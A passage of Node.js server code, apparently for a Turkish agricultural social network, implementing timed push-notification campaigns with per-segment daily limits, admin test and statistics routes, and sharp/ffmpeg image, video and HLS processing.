        const rows = await dbAll(
            `SELECT COUNT(*) as cnt FROM comments WHERE "createdAt" > NOW() - INTERVAL '1 hour'`
        );
        return rows && rows.length > 0 ? parseInt(rows[0].cnt) : 0;
    } catch (_) { return 0; }
}

// Bugün pazaryerine eklenen ürün sayısı
async function getTodayMarketplaceCount() {
    try {
        const rows = await dbAll(
            `SELECT COUNT(*) as cnt FROM marketplace_items WHERE "createdAt" > NOW() - INTERVAL '24 hours' AND status='active'`
        ).catch(() => null);
        return rows && rows.length > 0 ? parseInt(rows[0].cnt) : 0;
    } catch (_) { return 0; }
}

// Şu an online kullanıcı sayısı
async function getOnlineUserCount() {
    try {
        const rows = await dbAll(
            `SELECT COUNT(*) as cnt FROM users WHERE "isOnline"=TRUE AND "isActive"=TRUE`
        );
        return rows && rows.length > 0 ? parseInt(rows[0].cnt) : 0;
    } catch (_) { return 0; }
}

// ── Kampanya gönderim logu kontrolü ──────────────────────────────────────────
// Aynı kampanya bugün bu kullanıcıya gönderildiyse true döner → atla
async function alreadySentToday(userId, campaign) {
    try {
        const rows = await dbAll(
            `SELECT id FROM notification_send_log
             WHERE "userId"=$1 AND campaign=$2 AND date=CURRENT_DATE`,
            [userId, campaign]
        );
        return rows && rows.length > 0;
    } catch (_) { return false; }
}

async function markSent(userId, campaign) {
    try {
        await dbRun(
            `INSERT INTO notification_send_log ("userId", campaign, date)
             VALUES ($1, $2, CURRENT_DATE)
             ON CONFLICT ("userId", campaign, date) DO NOTHING`,
            [userId, campaign]
        );
    } catch (_) {}
}

// ── FCM tokenı olan tüm aktif kullanıcıları getir ────────────────────────────
async function getUsersWithFcmTokens(segments = ['active','medium','passive']) {
    try {
        const rows = await dbAll(`
            SELECT DISTINCT u.id, u.name, u."lastLogin"
            FROM users u
            JOIN device_tokens dt ON dt."userId" = u.id
            WHERE dt."isActive" = TRUE
              AND dt.platform IN ('android','ios','web_fcm')
              AND u."isActive" = TRUE
              AND u."isBanned" = FALSE
              AND u."lastLogin" > NOW() - INTERVAL '30 days'
        `);
        if (!rows) return [];

        // Segment filtresi
        const segmentFilter = async (user) => {
            const seg = await getUserSegment(user.id);
            return segments.includes(seg);
        };

        const filtered = [];
        for (const u of rows) {
            if (await segmentFilter(u)) filtered.push(u);
        }
        return filtered;
    } catch (_) { return []; }
}

// ── Belirli bir kullanıcı kümesine kampanya gönder ────────────────────────────
// opts.campaign: kampanya adı (duplicate koruması için)
// opts.title / opts.body: bildirim metni
// opts.segments: hangi segmentler alacak
// Günlük global bildirim limiti: aktif→3, orta→2, pasif→1
const DAILY_NOTIF_CAP = { active: 3, medium: 2, passive: 1 };

async function getDailyNotifCount(userId) {
    try {
        const r = await dbAll(
            `SELECT COUNT(*) as cnt FROM notification_send_log WHERE "userId"=$1 AND date=CURRENT_DATE`,
            [userId]
        );
        return r && r.length > 0 ? parseInt(r[0].cnt) : 0;
    } catch (_) { return 99; }
}

async function sendCampaign(opts) {
    if (process.env.SMART_NOTIF_ENABLED !== 'true') return;
    const { campaign, title, body, segments = ['active','medium','passive'], data = {} } = opts;
    try {
        const users = await getUsersWithFcmTokens(segments);
        let sent = 0;
        for (const user of users) {
            // ① Aynı kampanya bugün gitti mi?
            if (await alreadySentToday(user.id, campaign)) continue;
            // ② Global günlük cap aşıldı mı?
            const seg  = await getUserSegment(user.id);
            const cap  = DAILY_NOTIF_CAP[seg] ?? 1;
            const sent_today = await getDailyNotifCount(user.id);
            if (sent_today >= cap) {
                console.log(`[SmartNotif] ${campaign} atlandı (günlük limit ${cap}) → userId=${user.id}`);
                continue;
            }
            await sendFcmPush(user.id, { title, body, data });
            await markSent(user.id, campaign);
            sent++;
        }
        if (sent > 0) console.log(`[SmartNotif] ${campaign} → ${sent} kullanıcıya gönderildi`);
    } catch (e) {
        console.error('[SmartNotif sendCampaign]', e.message);
    }
}

// ── 🌅 SABAH KAMPANYASI (07:30) ───────────────────────────────────────────────
async function runMorningCampaign() {
    try {
        const [trending, category, onlineCount] = await Promise.all([
            getTodayTrendingPost(),
            getTodayTopCategory(),
            getOnlineUserCount()
        ]);

        let title = '🌅 Günaydın! Tarım gündemi hazır';
        let body  = 'Bugün çiftçiler ne konuşuyor? Bir bak!';

        if (category) {
            title = `🌱 Günaydın! "${category}" gündemde`;
            body  = `Topluluk bugün ${category} konusunu tartışıyor. Sen ne düşünüyorsun?`;
        }
        if (trending && trending.authorName) {
            body = `${trending.authorName} bugün önemli bir konu paylaştı. Kaçırma!`;
        }
        if (onlineCount > 10) {
            title = `🌅 Günaydın! Şu an ${onlineCount} çiftçi aktif`;
        }

        await sendCampaign({
            campaign : 'morning',
            title,
            body,
            segments : ['active', 'medium'],
            data     : { url: '/feed', type: 'morning' }
        });
    } catch (e) { console.error('[SmartNotif morning]', e.message); }
}

// ── ☀️ ÖĞLE KAMPANYASI (12:30) ─────────────────────────────────────────────────
async function runNoonCampaign() {
    try {
        const [trending, commentCount] = await Promise.all([
            getTodayTrendingPost(),
            getRecentCommentCount()
        ]);

        let title = '🔥 Öğle vakti, tartışmalar kızışıyor';
        let body  = 'Herkes bunu konuşuyor — sen ne düşünüyorsun?';

        if (trending) {
            const preview = trending.content
                ? trending.content.substring(0, 60).replace(/\n/g, ' ') + '…'
                : 'yeni bir konu';
            title = '💬 Şu an en çok konuşulan konu';
            body  = preview;
        }
        if (commentCount > 20) {
            title = `💬 Son 1 saatte ${commentCount} yorum geldi!`;
            body  = 'Tartışmalar hızlandı. Sen de katıl!';
        }

        await sendCampaign({
            campaign : 'noon',
            title,
            body,
            segments : ['active', 'medium', 'passive'],
            data     : { url: '/explore', type: 'noon' }
        });
    } catch (e) { console.error('[SmartNotif noon]', e.message); }
}

// ── 🌇 AKŞAM SERİ — 1. Bildirim (18:00): Kanca ─────────────────────────────
async function runEveningSeries1() {
    try {
        const trending = await getTodayTrendingPost();

        let title = '🔥 Bugün büyük bir tartışma başladı…';
        let body  = 'Tarım topluluğu hareketlendi. Ne olduğunu merak ediyor musun?';

        if (trending && trending.authorName) {
            title = `🔥 ${trending.authorName} patladı!`;
            body  = 'Bugünün en çok konuşulan paylaşımı için tıkla…';
        }

        await sendCampaign({
            campaign : 'serial_1',
            title,
            body,
            segments : ['active', 'medium', 'passive'],
            data     : { url: '/explore', type: 'serial_1' }
        });
    } catch (e) { console.error('[SmartNotif serial_1]', e.message); }
}

// ── 🌇 AKŞAM SERİ — 2. Bildirim (19:30): Büyüyor ────────────────────────────
async function runEveningSeries2() {
    try {
        const [trending, commentCount] = await Promise.all([
            getTodayTrendingPost(),
            getRecentCommentCount()
        ]);

        let title = '👀 O konu büyüyor';
        let body  = 'Yorumlar dinmek bilmiyor. Hâlâ kaçırıyor musun?';

        if (commentCount > 15) {
            title = `👀 Son 1 saatte ${commentCount} yorum!`;
            body  = 'Konu iyice alevlendi. Senin fikrin ne?';
        } else if (trending) {
            const likeScore = (trending.score || 0);
            title = likeScore > 50
                ? `👀 ${likeScore}+ etkileşim — konu patlamak üzere`
                : '👀 O konu büyüyor';
        }

        await sendCampaign({
            campaign : 'serial_2',
            title,
            body,
            segments : ['active', 'medium', 'passive'],
            data     : { url: '/explore', type: 'serial_2' }
        });
    } catch (e) { console.error('[SmartNotif serial_2]', e.message); }
}

// ── 🌇 AKŞAM SERİ — 3. Bildirim (20:30): Patlama ───────────────────────────
async function runEveningSeries3() {
    try {
        const [trending, marketCount, onlineCount] = await Promise.all([
            getTodayTrendingPost(),
            getTodayMarketplaceCount(),
            getOnlineUserCount()
        ]);

        let title = '💥 Patladı! Kaçırma';
        let body  = 'Bugünün en büyük tartışması zirveye ulaştı!';

        if (trending) {
            const preview = trending.content
                ? trending.content.substring(0, 55).replace(/\n/g, ' ') + '…'
                : 'paylaşım';
            title = '💥 Günün en iyi paylaşımı burada!';
            body  = preview;
        }
        if (onlineCount > 20) {
            title = `💥 Şu an ${onlineCount} çiftçi aktif — katıl!`;
        }
        if (marketCount > 5) {
            body += ` Ayrıca bugün ${marketCount} yeni ürün pazara eklendi.`;
        }

        await sendCampaign({
            campaign : 'serial_3',
            title,
            body,
            segments : ['active', 'medium', 'passive'],
            data     : { url: '/explore', type: 'serial_3' }
        });
    } catch (e) { console.error('[SmartNotif serial_3]', e.message); }
}

// ── 🌙 GECE KAMPANYASI (21:30) ────────────────────────────────────────────────
async function runNightCampaign() {
    try {
        const [trending, marketCount] = await Promise.all([
            getTodayTrendingPost(),
            getTodayMarketplaceCount()
        ]);

        let title = '🌙 Bugün kaçırdıklarını gör';
        let body  = 'Günün özeti seni bekliyor. Sana özel içerikler hazır!';

        if (trending && trending.authorName) {
            title = '🌙 Bugünün en iyi paylaşımı';
            body  = `${trending.authorName} bugün toplumu hareketlendirdi. Görmedin mi?`;
        }
        if (marketCount > 3) {
            body = `Bugün ${marketCount} yeni ürün pazara çıktı. Kaçırma!`;
        }

        // Gece bildirimi sadece aktif & orta → pasif kullanıcıyı rahatsız etme
        await sendCampaign({
            campaign : 'night',
            title,
            body,
            segments : ['active', 'medium'],
            data     : { url: '/feed', type: 'night' }
        });
    } catch (e) { console.error('[SmartNotif night]', e.message); }
}

// ── 🔴 PASSİF KULLANICI — "Seni özledik" (her 3 günde 1) ─────────────────────
async function runPassiveCampaign() {
    try {
        const onlineCount = await getOnlineUserCount();
        const title = '🌾 Seni özledik!';
        const body  = onlineCount > 5
            ? `Şu an ${onlineCount} çiftçi aktif. Aramıza katıl!`
            : 'AgroLink\'te senin gibi binlerce çiftçi bekliyor. Hadi dön!';

        await sendCampaign({
            campaign : 'passive_return',
            title,
            body,
            segments : ['passive'],
            data     : { url: '/feed', type: 'passive_return' }
        });
    } catch (e) { console.error('[SmartNotif passive]', e.message); }
}

// ── CRON ZAMANLAYICI ─────────────────────────────────────────────────────────
if (cron && process.env.SMART_NOTIF_ENABLED === 'true') {
    // 🌅 07:30 — Sabah rutini (aktif + orta)
    cron.schedule('30 7 * * *', runMorningCampaign, { timezone: 'Europe/Istanbul' });

    // ☀️ 12:30 — Öğle (tüm segmentler)
    cron.schedule('30 12 * * *', runNoonCampaign, { timezone: 'Europe/Istanbul' });

    // 🌇 18:00 — Seri 1: Kanca
    cron.schedule('0 18 * * *', runEveningSeries1, { timezone: 'Europe/Istanbul' });

    // 🌇 19:30 — Seri 2: Büyüyor
    cron.schedule('30 19 * * *', runEveningSeries2, { timezone: 'Europe/Istanbul' });

    // 🌇 20:30 — Seri 3: Patlama
    cron.schedule('30 20 * * *', runEveningSeries3, { timezone: 'Europe/Istanbul' });

    // 🌙 21:30 — Gece özeti (aktif + orta)
    cron.schedule('30 21 * * *', runNightCampaign, { timezone: 'Europe/Istanbul' });

    // 🔴 Pazartesi + Perşembe 10:00 — Pasif kullanıcı geri getirme
    cron.schedule('0 10 * * 1,4', runPassiveCampaign, { timezone: 'Europe/Istanbul' });

    console.log('✅ Akıllı Bildirim zamanlayıcıları başlatıldı (Europe/Istanbul)');
}

// ── ADMIN TEST + İSTATİSTİK ROTALARI ─────────────────────────────────────────

// POST /api/admin/smart-notif/test — Kampanya anında test et (geliştirici)
app.post('/api/admin/smart-notif/test', authenticateToken, async (req, res) => {
    try {
        if (req.user.role !== 'admin') return res.status(403).json({ error: 'Yetkisiz' });
        const { campaign } = req.body;
        const campaigns = {
            morning   : runMorningCampaign,
            noon      : runNoonCampaign,
            serial_1  : runEveningSeries1,
            serial_2  : runEveningSeries2,
            serial_3  : runEveningSeries3,
            night     : runNightCampaign,
            passive   : runPassiveCampaign,
        };
        if (!campaigns[campaign]) {
            return res.status(400).json({ error: 'Geçersiz kampanya', valid: Object.keys(campaigns) });
        }
        // Test için env'i geçici aç
        const prev = process.env.SMART_NOTIF_ENABLED;
        process.env.SMART_NOTIF_ENABLED = 'true';
        await campaigns[campaign]();
        process.env.SMART_NOTIF_ENABLED = prev;
        res.json({ success: true, campaign, message: 'Test gönderildi' });
    } catch (e) {
        res.status(500).json({ error: 'Hata: ' + e.message });
    }
});

// GET /api/admin/smart-notif/stats — Gönderim istatistikleri
app.get('/api/admin/smart-notif/stats', authenticateToken, async (req, res) => {
    try {
        if (req.user.role !== 'admin') return res.status(403).json({ error: 'Yetkisiz' });

        const [daily, segments, topHours] = await Promise.all([
            // Son 7 günün kampanya özeti
            dbAll(`
                SELECT date, campaign, COUNT(*) as total
                FROM notification_send_log
                WHERE date >= CURRENT_DATE - 7
                GROUP BY date, campaign
                ORDER BY date DESC, campaign
            `),
            // Segment dağılımı
            dbAll(`
                SELECT
                    SUM(CASE WHEN "lastLogin" > NOW()-INTERVAL '2 days'  THEN 1 ELSE 0 END) AS active,
                    SUM(CASE WHEN "lastLogin" BETWEEN NOW()-INTERVAL '7 days' AND NOW()-INTERVAL '2 days' THEN 1 ELSE 0 END) AS medium,
                    SUM(CASE WHEN "lastLogin" BETWEEN NOW()-INTERVAL '30 days' AND NOW()-INTERVAL '7 days' THEN 1 ELSE 0 END) AS passive,
                    SUM(CASE WHEN "lastLogin" < NOW()-INTERVAL '30 days' OR "lastLogin" IS NULL THEN 1 ELSE 0 END) AS dormant
                FROM users WHERE "isActive"=TRUE AND "isBanned"=FALSE
            `),
            // En popüler giriş saatleri
            dbAll(`
                SELECT hour, COUNT(*) as cnt
                FROM user_login_hours
                WHERE "loggedAt" > NOW() - INTERVAL '7 days'
                GROUP BY hour ORDER BY cnt DESC LIMIT 10
            `)
        ]);

        res.json({
            dailySummary : daily,
            userSegments : segments[0] || {},
            topLoginHours: topHours,
            schedulerActive: !!(cron && process.env.SMART_NOTIF_ENABLED === 'true'),
        });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// ════════════════════════════════════════════════════════════════════════════
// ← Akıllı Bildirim Sistemi sonu
// ════════════════════════════════════════════════════════════════════════════

// ==================== DİZİN YAPISI ====================

const uploadsDir   = path.join(__dirname, 'uploads');
const profilesDir  = path.join(uploadsDir, 'profiles');
const postsDir     = path.join(uploadsDir, 'posts');
const videosDir    = path.join(uploadsDir, 'videos');
const thumbnailsDir= path.join(uploadsDir, 'thumbnails');
const hlsDir       = path.join(uploadsDir, 'hls');
const tempDir      = path.join(uploadsDir, 'temp');
const musicDir     = path.join(uploadsDir, 'müzik');

// ════════════════════════════════════════════════════════════════════
// 🖼️ GÖRÜNTÜ İŞLEME — Concurrency Limiter + processImage Helper
// ════════════════════════════════════════════════════════════════════
// NEDEN:
//   • sequentialRead:true → EXIF orientation verisi pipeline başlamadan okunamıyor
//     → Dikey fotoğraflar 90° yatmış görünüyor (iPhone/Android)
//   • effort:1-2 → WebP sıkıştırma verimsiz, daha büyük dosyalar
//   • Concurrency kontrolü yok → çok upload = CPU spike, timeout
//
// ÇÖZÜM:
//   • sequentialRead KALDIRILDI → random-access mod, EXIF tam okunuyor
//   • .rotate() her zaman ilk pipeline adımı → EXIF orientation strip + uygula
//   • effort:4, smartSubsample:true → %15-25 küçük dosya, aynı kalite
//   • Semaphore → aynı anda max N resim işlenir

const IMG_CONCURRENCY = Math.min(os.cpus().length, 4); // max 4 paralel işlem
let _imgActive = 0;
const _imgQueue = [];

function acquireImgSlot() {
    return new Promise(resolve => {
        const tryAcquire = () => {
            if (_imgActive < IMG_CONCURRENCY) {
                _imgActive++;
                resolve(() => {
                    _imgActive--;
                    if (_imgQueue.length) _imgQueue.shift()();
                });
            } else {
                _imgQueue.push(tryAcquire);
            }
        };
        tryAcquire();
    });
}

/**
 * Resmi işler: EXIF rotasyonu düzeltir, boyutlandırır, WebP'e çevirir.
 * @param {string} inputPath  - Kaynak dosya yolu
 * @param {string} outputPath - Hedef dosya yolu (.webp)
 * @param {object} opts
 *   width, height  : Maksimum boyut (varsayılan 1920×1920)
 *   fit            : sharp fit modu ('inside' | 'cover') — varsayılan 'inside'
 *   quality        : WebP kalite 1-100 (varsayılan 78)
 *   effort         : WebP sıkıştırma çabası 0-6 (varsayılan 4)
 * @returns {Promise<sharp.OutputInfo>}
 */
async function processImage(inputPath, outputPath, {
    width   = 1920,
    height  = 1920,
    fit     = 'inside',
    quality = 78,
    effort  = 4,
} = {}) {
    const release = await acquireImgSlot();
    try {
        // sequentialRead YOK → random-access mod → EXIF orientation tam okunur
        // .rotate() ilk adım → orientation EXIF tag'i silinir, piksel olarak döndürülür
        // smartSubsample:true → renk kanalı alt örnekleme → %10-15 daha küçük dosya
        const info = await sharp(inputPath, { limitInputPixels: MAX_IMAGE_PIXELS })
            .rotate()                                                    // ← EXIF portrait fix
            .resize(width, height, { fit, withoutEnlargement: true, kernel: 'lanczos3' })
            .webp({ quality, effort, smartSubsample: true })
            .toFile(outputPath);
        return info;
    } finally {
        release();
    }
}

/**
 * Buffer'dan resim işler (Google profil fotoğrafı gibi URL'den indirilen resimler için)
 */
async function processImageBuffer(inputBuffer, outputPath, opts = {}) {
    const release = await acquireImgSlot();
    const { width = 300, height = 300, fit = 'cover', quality = 62, effort = 3 } = opts;
    try {
        const info = await sharp(inputBuffer, { limitInputPixels: MAX_IMAGE_PIXELS })
            .rotate()
            .resize(width, height, { fit, withoutEnlargement: true, kernel: 'lanczos3' })
            .webp({ quality, effort, smartSubsample: true })
            .toFile(outputPath);
        return info;
    } finally {
        release();
    }
}

[uploadsDir, profilesDir, postsDir, videosDir, thumbnailsDir, hlsDir, tempDir, musicDir].forEach(dir => {
    if (!fssync.existsSync(dir)) {
        fssync.mkdirSync(dir, { recursive: true });
    }
});

// ==================== 🎬 VİDEO SIKIŞTIRMA KONFİGÜRASYONU ====================

const VIDEO_CONFIG = {
    codec       : 'libx264',
    audioCodec  : 'aac',
    audioBitrate: '128k',      // ⬇ 192k→128k (sosyal medya için yeterli)
    quality     : 32,          // ⬇ CRF 28→32 (daha küçük dosya, iyi kalite)
    preset      : 'ultrafast', // ⚡ veryfast → ultrafast (en hızlı encode)
    movflags    : '+faststart', // Web streaming için kritik (metadata başa alınır)
    threads     : '0',          // Tüm CPU çekirdeklerini kullan
    maxWidth    : 1280,         // ⬇ 1920→1280 (720p yeterli, daha küçük dosya)
    maxHeight   : 720,          // ⬇ 1080→720
    fps         : 30,
    maxDuration : 600,          // Maks 10 dk
};

// ── Akıllı CRF: dosya büyüklüğüne göre sıkıştırma oranını artır ──────────────
// 50MB altı: CRF 30 (iyi kalite)
// 50-100MB:  CRF 33 (orta sıkıştırma)
// 100MB+:    CRF 36 (agresif sıkıştırma)
function getAdaptiveCrf(sizeMB) {
    if (sizeMB < 50)  return 30;
    if (sizeMB < 100) return 33;
    return 36;
}

// ── Akıllı çözünürlük: kaynağa göre en uygun boyutu seç ─────────────────────
function getAdaptiveResolution(srcW, srcH, sizeMB) {
    // Büyük dosyalarda çözünürlüğü de düşür
    const maxH = sizeMB > 100 ? 480 : (sizeMB > 50 ? 720 : 720);
    const maxW = sizeMB > 100 ? 854 : 1280;
    return {
        width : Math.min(srcW, maxW),
        height: Math.min(srcH, maxH),
    };
}

// Parçalı yükleme için eşik: bu boyuttan büyük videolar chunk'lanır (MB)
const CHUNK_THRESHOLD_MB = 50;

// HLS Adaptive Bitrate varyantları — küçültülmüş bitrate (sosyal medya standardı)
const HLS_VARIANTS = [
    { name: '360p',  width: 640,  height: 360,  videoBitrate: '500k',  audioBitrate: '64k'  },
    { name: '720p',  width: 1280, height: 720,  videoBitrate: '1500k', audioBitrate: '96k'  },
    { name: '1080p', width: 1920, height: 1080, videoBitrate: '3000k', audioBitrate: '128k' },
];

// ─── Video meta bilgisi al ─────────────────────────────────────────
function getVideoInfo(inputPath) {
    return new Promise((resolve) => {
        if (!fssync.existsSync(inputPath)) {
            return resolve({ duration: 0, width: 1920, height: 1080, aspectRatio: '16:9', bitrate: 5000, codec: 'h264', fileSize: 0, fps: 30 });
        }
        ffmpeg.ffprobe(inputPath, (err, meta) => {
            if (err) {
                console.error('❌ ffprobe hatası:', err.message);
                return resolve({ duration: 0, width: 1920, height: 1080, aspectRatio: '16:9', bitrate: 5000, codec: 'h264', fileSize: 0, fps: 30 });
            }
            try {
                const vs  = meta.streams.find(s => s.codec_type === 'video');
                const as  = meta.streams.find(s => s.codec_type === 'audio');
                let fps = 30;
                if (vs?.r_frame_rate) {
                    const [a, b] = vs.r_frame_rate.split('/').map(Number);
                    if (b) fps = a / b;
                }
                resolve({
                    duration   : meta.format?.duration  || 0,
                    width      : vs?.width              || 1920,
                    height     : vs?.height             || 1080,
                    aspectRatio: vs?.display_aspect_ratio || '16:9',
                    bitrate    : meta.format?.bit_rate ? Math.round(meta.format.bit_rate / 1000) : 5000,
                    codec      : vs?.codec_name         || 'h264',
                    audioCodec : as?.codec_name         || 'aac',
                    fileSize   : meta.format?.size       || 0,
                    fps        : Math.round(fps),
                });
            } catch (e) {
                resolve({ duration: 0, width: 1920, height: 1080, aspectRatio: '16:9', bitrate: 5000, codec: 'h264', fileSize: 0, fps: 30 });
            }
        });
    });
}

// ─── Video optimize et (mp4, faststart) ─────────────────────────────
function optimizeVideo(inputPath, outputPath) {
    return new Promise(async (resolve, reject) => {
        const startTime = Date.now();
        console.log(`🎬 Video sıkıştırma: ${path.basename(inputPath)}`);

        if (!fssync.existsSync(inputPath)) return reject(new Error('Input dosyası bulunamadı'));

        const stats     = fssync.statSync(inputPath);
        const sizeMB    = stats.size / (1024 * 1024);
        const outputDir = path.dirname(outputPath);
        if (!fssync.existsSync(outputDir)) fssync.mkdirSync(outputDir, { recursive: true });

        let vInfo = { width: 1280, height: 720, fps: 30 };
        try { vInfo = await getVideoInfo(inputPath); } catch (_) {}

        // ⚡ Akıllı CRF ve çözünürlük — dosya boyutuna göre agresifleşir
        const adaptiveCrf = getAdaptiveCrf(sizeMB);
        const { width: maxW, height: maxH } = getAdaptiveResolution(vInfo.width, vInfo.height, sizeMB);

        const tw = Math.min(vInfo.width,  maxW);
        const th = Math.min(vInfo.height, maxH);
        const tf = Math.min(vInfo.fps || 30, VIDEO_CONFIG.fps);

        // Oran korunur, H.264 çift piksel zorunluluğu
        const scaleFilter = `scale='min(${tw},iw)':'min(${th},ih)':force_original_aspect_ratio=decrease,scale=trunc(iw/2)*2:trunc(ih/2)*2`;

        console.log(`🎬 [Compress] ${sizeMB.toFixed(1)}MB | CRF:${adaptiveCrf} | Max:${tw}x${th}`);

        // Büyük/yüksek çözünürlüklü videolar için timeout: dosya başına max 30 dakika
        const FFMPEG_TIMEOUT_MS = 30 * 60 * 1000;
        let ffmpegProc = null;
        const timeoutHandle = setTimeout(() => {
            console.error(`⏰ [FFmpeg] Timeout: ${videoId || path.basename(inputPath)}`);
            if (ffmpegProc) try { ffmpegProc.kill('SIGKILL'); } catch (_) {}
        }, FFMPEG_TIMEOUT_MS);

        ffmpegProc = ffmpeg(inputPath)
            .videoCodec(VIDEO_CONFIG.codec)
            .audioCodec(VIDEO_CONFIG.audioCodec)
            .outputOptions([
                `-crf ${adaptiveCrf}`,
                '-preset fast',          // ultrafast → fast: boyut/kalite dengesi
                `-movflags ${VIDEO_CONFIG.movflags}`,
                `-threads ${VIDEO_CONFIG.threads}`,
                `-r ${tf}`,
                `-b:a ${VIDEO_CONFIG.audioBitrate}`,
                '-ac 2',
                `-vf ${scaleFilter}`,
                '-pix_fmt yuv420p',
                '-profile:v high',       // baseline → high: yüksek çözünürlük desteği
                '-level 4.2',            // 3.1 → 4.2: 1080p+ için gerekli
                '-max_muxing_queue_size 1024', // büyük dosyalarda muxer kuyruğu taşmasını önle
            ])
            .format('mp4')
            .on('end', async () => {
                clearTimeout(timeoutHandle);
                const outSize = fssync.existsSync(outputPath) ? fssync.statSync(outputPath).size : 0;
                const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
                const reduction = outSize ? (((sizeMB - outSize / 1024 / 1024) / sizeMB) * 100).toFixed(1) : 0;
                console.log(`✅ Video hazır: ${sizeMB.toFixed(1)}MB → ${(outSize/1024/1024).toFixed(1)}MB (%${reduction} azalma) ${elapsed}s`);
                try { await fs.unlink(inputPath); } catch (_) {}
                resolve({ success: true, optimized: true, fileSize: outSize, reduction: parseFloat(reduction) });
            })
            .on('error', async (err) => {
                clearTimeout(timeoutHandle);
                console.error('❌ FFmpeg hatası, fallback kopyalama:', err.message);
                try {
                    await fs.copyFile(inputPath, outputPath);
                    const fb = fssync.statSync(outputPath);
                    try { await fs.unlink(inputPath); } catch (_) {}
                    resolve({ success: true, optimized: false, fileSize: fb.size });
                } catch (e) {
                    reject(e);
                }
            })
            .save(outputPath);
    });
}

// ─── Video thumbnail oluştur ─────────────────────────────────────────
function createVideoThumbnail(videoPath, thumbnailPath) {
    return new Promise((resolve) => {
        if (!fssync.existsSync(videoPath)) return resolve(false);
        const thumbDir = path.dirname(thumbnailPath);
        if (!fssync.existsSync(thumbDir)) fssync.mkdirSync(thumbDir, { recursive: true });

        // Thumbnail yolunu kesinlikle .jpg yap
        const finalThumbPath = thumbnailPath.replace(/\.[^.]+$/, '.jpg');

        ffmpeg(videoPath)
            .screenshots({
                timestamps: ['00:00:01'],
                filename  : path.basename(finalThumbPath),
                folder    : thumbDir,
                size      : '640x360',
            })
            .on('end', async () => {
                // ffmpeg çıktısı bazen webp/png olabilir, sharp ile kesinlikle jpg'ye dönüştür
                try {
                    await sharp(finalThumbPath)
                        .rotate()
                        .jpeg({ quality: 85 })
                        .toFile(finalThumbPath + '.tmp.jpg');
                    fssync.renameSync(finalThumbPath + '.tmp.jpg', finalThumbPath);
                } catch (_) {}
                console.log('✅ Thumbnail [jpg]:', finalThumbPath);
                resolve(true);
            })
            .on('error', async (err) => {
                console.error('❌ Thumbnail hatası:', err.message);
                // Varsayılan yeşil placeholder jpg
                try {
                    await sharp({ create: { width: 640, height: 360, channels: 3, background: { r: 30, g: 100, b: 30 } } })
                        .jpeg({ quality: 80 }).toFile(finalThumbPath);
                    resolve(true);
                } catch { resolve(false); }
            });
    });
}

// ─── HLS Adaptive Bitrate (YouTube algoritması) ───────────────────────
// Üretilen yapı:
//   uploads/hls/{videoId}/master.m3u8         ← Ana manifest
//   uploads/hls/{videoId}/360p/playlist.m3u8  ← 360p segmentleri
//   uploads/hls/{videoId}/720p/playlist.m3u8  ← 720p segmentleri
//   uploads/hls/{videoId}/1080p/playlist.m3u8 ← 1080p segmentleri
//   Her segment = 4 saniye (YouTube standardı)
async function generateHLSVariants(inputMp4Path, videoId) {
    const startTime  = Date.now();
    const outputBase = path.join(hlsDir, videoId);

    console.log(`🎬 [HLS] Başlatılıyor → ${videoId}`);

    let vInfo = { width: 1920, height: 1080, fps: 30 };
    try { vInfo = await getVideoInfo(inputMp4Path); } catch (_) {}

    // Kaynağa uygun varyantları seç (gereksiz upscale yok)
    let activeVariants = HLS_VARIANTS.filter(v => v.height <= vInfo.height + 120);
    if (activeVariants.length === 0) activeVariants = [HLS_VARIANTS[0]];

    for (const v of activeVariants) {
        const dir = path.join(outputBase, v.name);
        if (!fssync.existsSync(dir)) fssync.mkdirSync(dir, { recursive: true });
    }

    const encodedVariants = [];

    // ⚡ TÜM VARYANTLARı PARALEL OLUŞTUR (eskiden sıralıydı, şimdi aynı anda)
    await Promise.all(activeVariants.map(async (variant) => {
        const outDir      = path.join(outputBase, variant.name);
        const playlist    = path.join(outDir, 'playlist.m3u8');
        const scaleFilter = `scale='min(${variant.width},iw)':'min(${variant.height},ih)':force_original_aspect_ratio=decrease,scale=trunc(iw/2)*2:trunc(ih/2)*2`;

        await new Promise((resolve) => {
            ffmpeg(inputMp4Path)
                .videoCodec('libx264')
                .audioCodec('aac')
                .outputOptions([
                    `-b:v ${variant.videoBitrate}`,
                    `-maxrate ${variant.videoBitrate}`,
                    `-bufsize ${parseInt(variant.videoBitrate) * 2}k`,
                    `-b:a ${variant.audioBitrate}`,
                    `-vf ${scaleFilter}`,
                    '-pix_fmt yuv420p',
                    '-profile:v main',
                    '-level 3.1',
                    '-preset ultrafast',            // ⚡ fast → ultrafast (3x daha hızlı)
                    '-tune fastdecode',             // ⚡ Hızlı oynatma için tune
                    '-hls_time 6',                  // ⚡ 4s → 6s (daha az segment dosyası)
                    '-hls_list_size 0',
                    '-hls_segment_type mpegts',
                    `-hls_segment_filename ${path.join(outDir, 'seg%03d.ts')}`,
                    '-hls_flags independent_segments+split_by_time',
                    '-f hls',
                ])
                .output(playlist)
                .on('end',   () => { console.log(`  ✅ [HLS] ${variant.name}`); resolve(); })
                .on('error', (e) => { console.error(`  ⚠️ [HLS] ${variant.name}: ${e.message}`); resolve(); })
                .run();
        });

        if (fssync.existsSync(playlist)) encodedVariants.push(variant);
    }));

    if (encodedVariants.length === 0) {
        console.warn(`⚠️ [HLS] Varyant oluşturulamadı: ${videoId}`);
        return false;
    }

    // Master manifest yaz
    let master = '#EXTM3U\n#EXT-X-VERSION:3\n';
    for (const v of encodedVariants) {
        const bps = parseInt(v.videoBitrate) * 1000;
        master += `#EXT-X-STREAM-INF:BANDWIDTH=${bps},RESOLUTION=${v.width}x${v.height},NAME="${v.name}"\n`;
        master += `${v.name}/playlist.m3u8\n`;
    }
    fssync.writeFileSync(path.join(outputBase, 'master.m3u8'), master, 'utf8');

    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    console.log(`✅ [HLS] Tamamlandı → ${videoId} (${elapsed}s)`);
    return true;
}

// ─── Yardımcı: video kalite etiketi ──────────────────────────────────
function getVideoQuality(w, h) {
    if (h >= 1080) return '1080p';
    if (h >= 720)  return '720p';
    if (h >= 480)  return '480p';
    if (h >= 360)  return '360p';
    return '240p';
}

// ─── Yardımcı: dosya boyutu formatla ─────────────────────────────────
function formatFileSize(bytes) {
    if (!bytes) return '0 B';
    const units = ['B', 'KB', 'MB', 'GB'];
    let i = 0, v = bytes;
    while (v >= 1024 && i < units.length - 1) { v /= 1024; i++; }
    return `${v.toFixed(1)} ${units[i]}`;
}

